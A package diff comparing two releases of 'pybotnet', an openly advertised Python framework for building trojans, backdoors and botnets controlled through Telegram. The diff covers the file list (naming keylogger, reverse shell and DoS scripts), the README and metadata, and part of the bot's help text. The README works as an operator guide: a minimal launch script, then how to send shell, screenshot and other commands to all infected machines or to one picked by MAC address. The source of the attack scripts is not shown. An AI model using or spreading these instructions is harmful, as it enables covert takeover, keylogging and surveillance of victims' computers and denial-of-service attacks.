# Comparing `tmp/pybotnet-2.2.3.tar.gz` & `tmp/pybotnet-2.2.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pybotnet-2.2.3.tar", last modified: Sun Jan  8 10:15:49 2023, max compression
+gzip compressed data, was "pybotnet-2.2.4.tar", last modified: Thu Jun  8 11:46:01 2023, max compression
```

## Comparing `pybotnet-2.2.3.tar` & `pybotnet-2.2.4.tar`

### file list

```diff
@@ -1,49 +1,49 @@
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.187471 pybotnet-2.2.3/
--rw-r--r--   0 onion     (1000) onion     (1000)    26526 2022-07-18 10:23:17.000000 pybotnet-2.2.3/LICENSE
--rw-r--r--   0 onion     (1000) onion     (1000)       58 2022-07-18 10:23:17.000000 pybotnet-2.2.3/MANIFEST.in
--rw-rw-r--   0 onion     (1000) onion     (1000)     5868 2023-01-08 10:15:49.187471 pybotnet-2.2.3/PKG-INFO
--rw-rw-r--   0 onion     (1000) onion     (1000)     5095 2023-01-04 08:03:33.000000 pybotnet-2.2.3/README.md
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.183471 pybotnet-2.2.3/pybotnet/
--rw-r--r--   0 onion     (1000) onion     (1000)      348 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/__init__.py
--rw-r--r--   0 onion     (1000) onion     (1000)     1577 2022-08-05 11:05:35.000000 pybotnet-2.2.3/pybotnet/__main__.py
--rw-r--r--   0 onion     (1000) onion     (1000)    12615 2022-10-28 09:49:41.000000 pybotnet-2.2.3/pybotnet/botnet.py
--rw-r--r--   0 onion     (1000) onion     (1000)      878 2022-10-23 11:15:36.000000 pybotnet-2.2.3/pybotnet/context.py
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.183471 pybotnet-2.2.3/pybotnet/engines/
--rw-r--r--   0 onion     (1000) onion     (1000)      149 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/engines/__init__.py
--rw-r--r--   0 onion     (1000) onion     (1000)      724 2022-10-23 11:15:36.000000 pybotnet-2.2.3/pybotnet/engines/base_engine.py
--rw-rw-r--   0 onion     (1000) onion     (1000)     6736 2023-01-08 10:13:14.000000 pybotnet-2.2.3/pybotnet/engines/telegram_engine.py
--rw-r--r--   0 onion     (1000) onion     (1000)      775 2022-10-23 11:15:36.000000 pybotnet-2.2.3/pybotnet/engines/test_engine.py
--rw-r--r--   0 onion     (1000) onion     (1000)       74 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/exceptions.py
--rw-rw-r--   0 onion     (1000) onion     (1000)       77 2023-01-08 10:13:14.000000 pybotnet-2.2.3/pybotnet/package_info.py
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.187471 pybotnet-2.2.3/pybotnet/scripts/
--rw-r--r--   0 onion     (1000) onion     (1000)      426 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/__init__.py
--rw-r--r--   0 onion     (1000) onion     (1000)     3524 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/dos.py
--rw-r--r--   0 onion     (1000) onion     (1000)      355 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/echo.py
--rw-r--r--   0 onion     (1000) onion     (1000)      718 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/get_file.py
--rw-r--r--   0 onion     (1000) onion     (1000)     3324 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/keylogger.py
--rw-r--r--   0 onion     (1000) onion     (1000)      922 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/openurl.py
--rw-r--r--   0 onion     (1000) onion     (1000)     2089 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/put_file.py
--rw-r--r--   0 onion     (1000) onion     (1000)     3337 2022-10-23 11:15:36.000000 pybotnet-2.2.3/pybotnet/scripts/reverse_shell.py
--rw-r--r--   0 onion     (1000) onion     (1000)     2622 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/runcode.py
--rw-r--r--   0 onion     (1000) onion     (1000)     4031 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/scheduler.py
--rw-r--r--   0 onion     (1000) onion     (1000)     1274 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/screenshot.py
--rw-r--r--   0 onion     (1000) onion     (1000)      746 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/scripts/who.py
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.187471 pybotnet-2.2.3/pybotnet/utils/
--rw-r--r--   0 onion     (1000) onion     (1000)      124 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/utils/__init__.py
--rw-r--r--   0 onion     (1000) onion     (1000)      461 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/utils/proxy.py
--rw-r--r--   0 onion     (1000) onion     (1000)      625 2022-10-23 11:15:36.000000 pybotnet-2.2.3/pybotnet/utils/serializer.py
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.187471 pybotnet-2.2.3/pybotnet/utils/third_party_proxy/
--rw-r--r--   0 onion     (1000) onion     (1000)        0 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/utils/third_party_proxy/__init__.py
--rw-rw-r--   0 onion     (1000) onion     (1000)     2029 2023-01-08 10:13:14.000000 pybotnet-2.2.3/pybotnet/utils/third_party_proxy/httpdebugger.py
--rw-r--r--   0 onion     (1000) onion     (1000)       46 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/utils/third_party_proxy/reqbin.py
--rw-r--r--   0 onion     (1000) onion     (1000)     4443 2022-10-23 11:15:36.000000 pybotnet-2.2.3/pybotnet/utils/upload_server.py
--rw-r--r--   0 onion     (1000) onion     (1000)     1229 2022-07-18 10:23:17.000000 pybotnet-2.2.3/pybotnet/utils/utils.py
-drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-01-08 10:15:49.183471 pybotnet-2.2.3/pybotnet.egg-info/
--rw-rw-r--   0 onion     (1000) onion     (1000)     5868 2023-01-08 10:15:49.000000 pybotnet-2.2.3/pybotnet.egg-info/PKG-INFO
--rw-rw-r--   0 onion     (1000) onion     (1000)     1096 2023-01-08 10:15:49.000000 pybotnet-2.2.3/pybotnet.egg-info/SOURCES.txt
--rw-rw-r--   0 onion     (1000) onion     (1000)        1 2023-01-08 10:15:49.000000 pybotnet-2.2.3/pybotnet.egg-info/dependency_links.txt
--rw-rw-r--   0 onion     (1000) onion     (1000)       84 2023-01-08 10:15:49.000000 pybotnet-2.2.3/pybotnet.egg-info/requires.txt
--rw-rw-r--   0 onion     (1000) onion     (1000)        9 2023-01-08 10:15:49.000000 pybotnet-2.2.3/pybotnet.egg-info/top_level.txt
--rw-rw-r--   0 onion     (1000) onion     (1000)       84 2023-01-04 08:03:33.000000 pybotnet-2.2.3/requirements.txt
--rw-r--r--   0 onion     (1000) onion     (1000)       79 2023-01-08 10:15:49.187471 pybotnet-2.2.3/setup.cfg
--rw-r--r--   0 onion     (1000) onion     (1000)     3580 2022-10-23 11:15:36.000000 pybotnet-2.2.3/setup.py
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.905974 pybotnet-2.2.4/
+-rw-r--r--   0 onion     (1000) onion     (1000)    26526 2022-07-18 10:23:17.000000 pybotnet-2.2.4/LICENSE
+-rw-r--r--   0 onion     (1000) onion     (1000)       58 2022-07-18 10:23:17.000000 pybotnet-2.2.4/MANIFEST.in
+-rw-rw-r--   0 onion     (1000) onion     (1000)     6035 2023-06-08 11:46:01.905974 pybotnet-2.2.4/PKG-INFO
+-rw-rw-r--   0 onion     (1000) onion     (1000)     5262 2023-05-23 14:34:54.000000 pybotnet-2.2.4/README.md
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.897974 pybotnet-2.2.4/pybotnet/
+-rw-r--r--   0 onion     (1000) onion     (1000)      348 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/__init__.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     1577 2022-08-05 11:05:35.000000 pybotnet-2.2.4/pybotnet/__main__.py
+-rw-rw-r--   0 onion     (1000) onion     (1000)    12277 2023-06-08 11:44:33.000000 pybotnet-2.2.4/pybotnet/botnet.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      878 2022-10-23 11:15:36.000000 pybotnet-2.2.4/pybotnet/context.py
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.901974 pybotnet-2.2.4/pybotnet/engines/
+-rw-r--r--   0 onion     (1000) onion     (1000)      149 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/engines/__init__.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      724 2022-10-23 11:15:36.000000 pybotnet-2.2.4/pybotnet/engines/base_engine.py
+-rw-rw-r--   0 onion     (1000) onion     (1000)     7082 2023-06-08 11:44:33.000000 pybotnet-2.2.4/pybotnet/engines/telegram_engine.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      775 2022-10-23 11:15:36.000000 pybotnet-2.2.4/pybotnet/engines/test_engine.py
+-rw-r--r--   0 onion     (1000) onion     (1000)       74 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/exceptions.py
+-rw-rw-r--   0 onion     (1000) onion     (1000)       77 2023-06-08 11:44:33.000000 pybotnet-2.2.4/pybotnet/package_info.py
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.901974 pybotnet-2.2.4/pybotnet/scripts/
+-rw-r--r--   0 onion     (1000) onion     (1000)      426 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/__init__.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     3524 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/dos.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      355 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/echo.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      718 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/get_file.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     3324 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/keylogger.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      922 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/openurl.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     2089 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/put_file.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     3337 2022-10-23 11:15:36.000000 pybotnet-2.2.4/pybotnet/scripts/reverse_shell.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     2622 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/runcode.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     4031 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/scheduler.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     1274 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/screenshot.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      746 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/scripts/who.py
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.905974 pybotnet-2.2.4/pybotnet/utils/
+-rw-r--r--   0 onion     (1000) onion     (1000)      124 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/utils/__init__.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      461 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/utils/proxy.py
+-rw-r--r--   0 onion     (1000) onion     (1000)      625 2022-10-23 11:15:36.000000 pybotnet-2.2.4/pybotnet/utils/serializer.py
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.905974 pybotnet-2.2.4/pybotnet/utils/third_party_proxy/
+-rw-r--r--   0 onion     (1000) onion     (1000)        0 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/utils/third_party_proxy/__init__.py
+-rw-rw-r--   0 onion     (1000) onion     (1000)     2029 2023-01-08 10:13:14.000000 pybotnet-2.2.4/pybotnet/utils/third_party_proxy/httpdebugger.py
+-rw-r--r--   0 onion     (1000) onion     (1000)       46 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/utils/third_party_proxy/reqbin.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     4443 2022-10-23 11:15:36.000000 pybotnet-2.2.4/pybotnet/utils/upload_server.py
+-rw-r--r--   0 onion     (1000) onion     (1000)     1229 2022-07-18 10:23:17.000000 pybotnet-2.2.4/pybotnet/utils/utils.py
+drwxrwxr-x   0 onion     (1000) onion     (1000)        0 2023-06-08 11:46:01.901974 pybotnet-2.2.4/pybotnet.egg-info/
+-rw-rw-r--   0 onion     (1000) onion     (1000)     6035 2023-06-08 11:46:01.000000 pybotnet-2.2.4/pybotnet.egg-info/PKG-INFO
+-rw-rw-r--   0 onion     (1000) onion     (1000)     1096 2023-06-08 11:46:01.000000 pybotnet-2.2.4/pybotnet.egg-info/SOURCES.txt
+-rw-rw-r--   0 onion     (1000) onion     (1000)        1 2023-06-08 11:46:01.000000 pybotnet-2.2.4/pybotnet.egg-info/dependency_links.txt
+-rw-rw-r--   0 onion     (1000) onion     (1000)       84 2023-06-08 11:46:01.000000 pybotnet-2.2.4/pybotnet.egg-info/requires.txt
+-rw-rw-r--   0 onion     (1000) onion     (1000)        9 2023-06-08 11:46:01.000000 pybotnet-2.2.4/pybotnet.egg-info/top_level.txt
+-rw-rw-r--   0 onion     (1000) onion     (1000)       84 2023-05-23 14:34:54.000000 pybotnet-2.2.4/requirements.txt
+-rw-r--r--   0 onion     (1000) onion     (1000)       79 2023-06-08 11:46:01.905974 pybotnet-2.2.4/setup.cfg
+-rw-r--r--   0 onion     (1000) onion     (1000)     3580 2022-10-23 11:15:36.000000 pybotnet-2.2.4/setup.py
```

### Comparing `pybotnet-2.2.3/LICENSE` & `pybotnet-2.2.4/LICENSE`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/PKG-INFO` & `pybotnet-2.2.4/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pybotnet
-Version: 2.2.3
+Version: 2.2.4
 Summary: A Python framework for building remote control, botnet , trojan or backdoor with Telegram or other control panels
 Home-page: https://github.com/onionj/pybotnet
 Author: onionj
 Author-email: onionj98@gmail.com
 License: gpl-3.0
 Keywords: onionj pybotnet,python remote control,python trojan,python backdoor,python botnet,pybotnet,python ddos,python backdoor,python trojan,reverse shell,python keyloggerframework
 Platform: UNKNOWN
@@ -46,15 +46,15 @@
 **Documentation**: <a href="https://onionj.github.io/pybotnet/" target="_blank">https://onionj.github.io/pybotnet/</a>
 
 **ToDo List**: <a href="https://github.com/users/onionj/projects/1" target="_blank">https://github.com/users/onionj/projects/1</a>
 
 ---
 
 ### Features:
-* Built in Telegram control pannel and proxy
+* Built in Telegram control pannel and proxy system
 * Built in scripts like:
     * reverse shell
     * put or get file
     * run python code on target systems
     * get screenshot
     * keylogger
     * dos
@@ -105,15 +105,15 @@
 
 ```console 
 python3 main.py
 ```
 
 #### telegram engine
 
-open telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:
+open telegram and send `/who` command to your bot; If you have done the steps correctly, you recive a message like this:
 
 ```
 scripts_name:
     echo
     who
     shell
     screenshot
@@ -137,15 +137,15 @@
 pid: 148352
 cpu_count: 8
 pybotnet_version: 2.0.8b0
 from cache: True
 ```
 
 
-you can send `/help` to see help page, or send `/help <script_name>` to recive more help about specific script.
+you can send `/help` to see help page, or send `/help <script_name>` to recive more help about a specific script.
 
 for example send `/help screenshot`, You will receive:
 
 ```
 NAME:
 screenshot
 
@@ -171,28 +171,29 @@
 os: Linux
 global_ip: 5.10.30.35
 country: Iran, Islamic Republic of
 bot_name: no_name
 use_proxy: False
 ```
 
-in top of message you see script name, description, syntax and examples.
+in top of message you see script name, description, syntax, and examples.
 
 for run screenshot script you have two choice:
 
 * Run the script on all clients that are listening to Telegram bot (for now we have one!)
 * Run script on one specific system
 
 for run script on all client send `/screenshot`.
 
-bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
+bot if you need to get screen-shot on a specific system you need to send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
 
 in some case like `/shell` you need to run it just for one system.
 
 
+For see who we can `Add custom scripts`, `Run in background`, `Running the pybotnet without coding`, and etc, see the below documentation.
 
 ### *For more, see [Documentation](https://onionj.github.io/pybotnet/)*
 
 
 ---
 
 ## Contributors ✨
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: pybotnet Version: 2.2.3 Summary: A Python framework
+Metadata-Version: 2.1 Name: pybotnet Version: 2.2.4 Summary: A Python framework
 for building remote control, botnet , trojan or backdoor with Telegram or other
 control panels Home-page: https://github.com/onionj/pybotnet Author: onionj
 Author-email: onionj98@gmail.com License: gpl-3.0 Keywords: onionj
 pybotnet,python remote control,python trojan,python backdoor,python
 botnet,pybotnet,python ddos,python backdoor,python trojan,reverse shell,python
 keyloggerframework Platform: UNKNOWN Classifier: License :: OSI Approved :: GNU
 Lesser General Public License v3 or later (LGPLv3+) Classifier: Programming
@@ -16,49 +16,51 @@
        [https://img.shields.io/pypi/v/pybotnet?label=pybotnet] [https://
  img.shields.io/github/license/onionj/pybotnet] [https://img.shields.io/pypi/
                              pyversions/pybotnet]
 > Disclaimer: Please note that this is a research project. I am by no means
 responsible for any usage of this tool. Use it on your behalf!. --- **Source
 Code**: https://github.com/onionj/pybotnet **Documentation**: https://
 onionj.github.io/pybotnet/ **ToDo List**: https://github.com/users/onionj/
-projects/1 --- ### Features: * Built in Telegram control pannel and proxy *
-Built in scripts like: * reverse shell * put or get file * run python code on
-target systems * get screenshot * keylogger * dos * scheduler * ... * Cross
-platform * Ability to easily add custom scripts * Import external scripts *
-Ability to add custom control panel * Add remote control to your apps * [...]
+projects/1 --- ### Features: * Built in Telegram control pannel and proxy
+system * Built in scripts like: * reverse shell * put or get file * run python
+code on target systems * get screenshot * keylogger * dos * scheduler * ... *
+Cross platform * Ability to easily add custom scripts * Import external scripts
+* Ability to add custom control panel * Add remote control to your apps * [...]
 (https://onionj.github.io/pybotnet/) ### Install PyBotNet ```console pip3
 install pybotnet -U ``` * `-U`: make sure to upgrade framework to latest
 version. #### The simplest PyBotNet file could look like this: ```py
 title="main.py" # in main.py from pybotnet import BotNet, TelegramEngine
 telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN,
 admin_chat_id=ADMIN_CHAT_ID) #(1) botnet = BotNet(telegram_engine) # (2)
 botnet.run() ``` 1. create engine: Engines transfer messages between admin and
 botnet 2. create BotNet instance #### note: * `TELEGRAM_TOKEN`: You can use
 telegram `@botfather` to Create new telegram API Bot and get your
 `TELEGRAM_TOKEN` * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot *
 PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/
 screenshot`, `/who`, ..., you can send `/help` to your telegram bot and see
 more detail.. #### Run code: ```console python3 main.py ``` #### telegram
-engine open telegram and send `/who` to your bot; If you have done the steps
-correctly, you recive message like this: ``` scripts_name: echo who shell
-screenshot put_file get_file runcode openurl dos schedule mac_addres:
+engine open telegram and send `/who` command to your bot; If you have done the
+steps correctly, you recive a message like this: ``` scripts_name: echo who
+shell screenshot put_file get_file runcode openurl dos schedule mac_addres:
 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of
 bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'}
 system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8
 pybotnet_version: 2.0.8b0 from cache: True ``` you can send `/help` to see help
-page, or send `/help ` to recive more help about specific script. for example
+page, or send `/help ` to recive more help about a specific script. for example
 send `/help screenshot`, You will receive: ``` NAME: screenshot DESCRIPTION:
 get screen shot * `[mac-address] /screenshot` or * `/screenshot` example
 command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-
 download-link script_version: 0.0.1 default_script: True
 ___________________________ scripts_name: ['echo', 'who', 'shell',
 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']
 mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic
 Republic of bot_name: no_name use_proxy: False ``` in top of message you see
-script name, description, syntax and examples. for run screenshot script you
+script name, description, syntax, and examples. for run screenshot script you
 have two choice: * Run the script on all clients that are listening to Telegram
 bot (for now we have one!) * Run script on one specific system for run script
-on all client send `/screenshot`. bot if you need get screen shot on specific
-system you need send `[mac_addres] /screenshot` for our case: `228362405364 /
-screenshot` in some case like `/shell` you need to run it just for one system.
+on all client send `/screenshot`. bot if you need to get screen-shot on a
+specific system you need to send `[mac_addres] /screenshot` for our case:
+`228362405364 /screenshot` in some case like `/shell` you need to run it just
+for one system. For see who we can `Add custom scripts`, `Run in background`,
+`Running the pybotnet without coding`, and etc, see the below documentation.
 ### *For more, see [Documentation](https://onionj.github.io/pybotnet/)* --- ##
 Contributors â¨ Thanks goes to these wonderful people :
```

### Comparing `pybotnet-2.2.3/README.md` & `pybotnet-2.2.4/README.md`

 * *Files 3% similar despite different names*

```diff
@@ -28,15 +28,15 @@
 **Documentation**: <a href="https://onionj.github.io/pybotnet/" target="_blank">https://onionj.github.io/pybotnet/</a>
 
 **ToDo List**: <a href="https://github.com/users/onionj/projects/1" target="_blank">https://github.com/users/onionj/projects/1</a>
 
 ---
 
 ### Features:
-* Built in Telegram control pannel and proxy
+* Built in Telegram control pannel and proxy system
 * Built in scripts like:
     * reverse shell
     * put or get file
     * run python code on target systems
     * get screenshot
     * keylogger
     * dos
@@ -87,15 +87,15 @@
 
 ```console 
 python3 main.py
 ```
 
 #### telegram engine
 
-open telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:
+open telegram and send `/who` command to your bot; If you have done the steps correctly, you recive a message like this:
 
 ```
 scripts_name:
     echo
     who
     shell
     screenshot
@@ -119,15 +119,15 @@
 pid: 148352
 cpu_count: 8
 pybotnet_version: 2.0.8b0
 from cache: True
 ```
 
 
-you can send `/help` to see help page, or send `/help <script_name>` to recive more help about specific script.
+you can send `/help` to see help page, or send `/help <script_name>` to recive more help about a specific script.
 
 for example send `/help screenshot`, You will receive:
 
 ```
 NAME:
 screenshot
 
@@ -153,28 +153,29 @@
 os: Linux
 global_ip: 5.10.30.35
 country: Iran, Islamic Republic of
 bot_name: no_name
 use_proxy: False
 ```
 
-in top of message you see script name, description, syntax and examples.
+in top of message you see script name, description, syntax, and examples.
 
 for run screenshot script you have two choice:
 
 * Run the script on all clients that are listening to Telegram bot (for now we have one!)
 * Run script on one specific system
 
 for run script on all client send `/screenshot`.
 
-bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
+bot if you need to get screen-shot on a specific system you need to send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
 
 in some case like `/shell` you need to run it just for one system.
 
 
+For see who we can `Add custom scripts`, `Run in background`, `Running the pybotnet without coding`, and etc, see the below documentation.
 
 ### *For more, see [Documentation](https://onionj.github.io/pybotnet/)*
 
 
 ---
 
 ## Contributors ✨
```

#### html2text {}

```diff
@@ -5,49 +5,51 @@
        [https://img.shields.io/pypi/v/pybotnet?label=pybotnet] [https://
  img.shields.io/github/license/onionj/pybotnet] [https://img.shields.io/pypi/
                              pyversions/pybotnet]
 > Disclaimer: Please note that this is a research project. I am by no means
 responsible for any usage of this tool. Use it on your behalf!. --- **Source
 Code**: https://github.com/onionj/pybotnet **Documentation**: https://
 onionj.github.io/pybotnet/ **ToDo List**: https://github.com/users/onionj/
-projects/1 --- ### Features: * Built in Telegram control pannel and proxy *
-Built in scripts like: * reverse shell * put or get file * run python code on
-target systems * get screenshot * keylogger * dos * scheduler * ... * Cross
-platform * Ability to easily add custom scripts * Import external scripts *
-Ability to add custom control panel * Add remote control to your apps * [...]
+projects/1 --- ### Features: * Built in Telegram control pannel and proxy
+system * Built in scripts like: * reverse shell * put or get file * run python
+code on target systems * get screenshot * keylogger * dos * scheduler * ... *
+Cross platform * Ability to easily add custom scripts * Import external scripts
+* Ability to add custom control panel * Add remote control to your apps * [...]
 (https://onionj.github.io/pybotnet/) ### Install PyBotNet ```console pip3
 install pybotnet -U ``` * `-U`: make sure to upgrade framework to latest
 version. #### The simplest PyBotNet file could look like this: ```py
 title="main.py" # in main.py from pybotnet import BotNet, TelegramEngine
 telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN,
 admin_chat_id=ADMIN_CHAT_ID) #(1) botnet = BotNet(telegram_engine) # (2)
 botnet.run() ``` 1. create engine: Engines transfer messages between admin and
 botnet 2. create BotNet instance #### note: * `TELEGRAM_TOKEN`: You can use
 telegram `@botfather` to Create new telegram API Bot and get your
 `TELEGRAM_TOKEN` * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot *
 PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/
 screenshot`, `/who`, ..., you can send `/help` to your telegram bot and see
 more detail.. #### Run code: ```console python3 main.py ``` #### telegram
-engine open telegram and send `/who` to your bot; If you have done the steps
-correctly, you recive message like this: ``` scripts_name: echo who shell
-screenshot put_file get_file runcode openurl dos schedule mac_addres:
+engine open telegram and send `/who` command to your bot; If you have done the
+steps correctly, you recive a message like this: ``` scripts_name: echo who
+shell screenshot put_file get_file runcode openurl dos schedule mac_addres:
 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of
 bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'}
 system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8
 pybotnet_version: 2.0.8b0 from cache: True ``` you can send `/help` to see help
-page, or send `/help ` to recive more help about specific script. for example
+page, or send `/help ` to recive more help about a specific script. for example
 send `/help screenshot`, You will receive: ``` NAME: screenshot DESCRIPTION:
 get screen shot * `[mac-address] /screenshot` or * `/screenshot` example
 command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-
 download-link script_version: 0.0.1 default_script: True
 ___________________________ scripts_name: ['echo', 'who', 'shell',
 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']
 mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic
 Republic of bot_name: no_name use_proxy: False ``` in top of message you see
-script name, description, syntax and examples. for run screenshot script you
+script name, description, syntax, and examples. for run screenshot script you
 have two choice: * Run the script on all clients that are listening to Telegram
 bot (for now we have one!) * Run script on one specific system for run script
-on all client send `/screenshot`. bot if you need get screen shot on specific
-system you need send `[mac_addres] /screenshot` for our case: `228362405364 /
-screenshot` in some case like `/shell` you need to run it just for one system.
+on all client send `/screenshot`. bot if you need to get screen-shot on a
+specific system you need to send `[mac_addres] /screenshot` for our case:
+`228362405364 /screenshot` in some case like `/shell` you need to run it just
+for one system. For see who we can `Add custom scripts`, `Run in background`,
+`Running the pybotnet without coding`, and etc, see the below documentation.
 ### *For more, see [Documentation](https://onionj.github.io/pybotnet/)* --- ##
 Contributors â¨ Thanks goes to these wonderful people :
```

### Comparing `pybotnet-2.2.3/pybotnet/__main__.py` & `pybotnet-2.2.4/pybotnet/__main__.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/botnet.py` & `pybotnet-2.2.4/pybotnet/botnet.py`

 * *Files 3% similar despite different names*

```diff
@@ -9,15 +9,15 @@
 import random
 import string
 import uuid
 import time
 import os
 
 from .context import Context
-from .exceptions import UserException, EngineException
+from .exceptions import UserException
 from .package_info import __version__, __github_link__
 from .utils import get_global_ip, get_host_name_ip
 
 
 if TYPE_CHECKING:
     from . import BaseEngine
 
@@ -50,20 +50,15 @@
         self.delay = delay
         self.use_default_scripts = use_default_scripts
         self.start_end_notify = start_end_notify
 
         self.scripts = {}
         self._debug = debug
         self.__run_time = time.time()
-        self.__cache = {
-            "system_info": {
-                "minimal": {"save_time": None, "data": None},
-                "full": {"save_time": None, "data": None},
-            }
-        }
+        self.__cache = {}
 
         if self.use_default_scripts:
             self.scripts.update(**BotNet.default_scripts)
 
         if self._debug:
             logging.basicConfig(level=logging.DEBUG)
         else:
@@ -130,47 +125,53 @@
 # Get more details about a script:
     `/help script-name`
     Example:
         `/help shell`
 
 # Run a script:
     
-    - For all bots:
+    - On all bots:
 
     `/[SCRIPT-NAME] [params]`
-        Example: 
-            `/echo hi`
+        Examples:
+            `/echo Hi`
             `/who`
 
+
     - For Select specific bot: 
 
+    + Option 1:
     `[mac-address] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(uuid.getnode())} /echo hi`
-            `{str(uuid.getnode())} /who`
+            `{str(uuid.getnode())} /echo Hi`
 
+    + Option 2:
     `[BOT-NAME] /[SCRIPT-NAME] [params]`
         Example:
-            `{self.BOT_NAME} /echo hi`
-            `{self.BOT_NAME} /who`
+            `{self.BOT_NAME} /echo Hi`
 
+    + Option 3:
     `[pid] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(os.getpid())} {self.BOT_NAME} /echo hi`
-            `{str(os.getpid())} {self.BOT_NAME} /who`
+            `{str(os.getpid())} /echo Hi`
 
+    + Option 4:
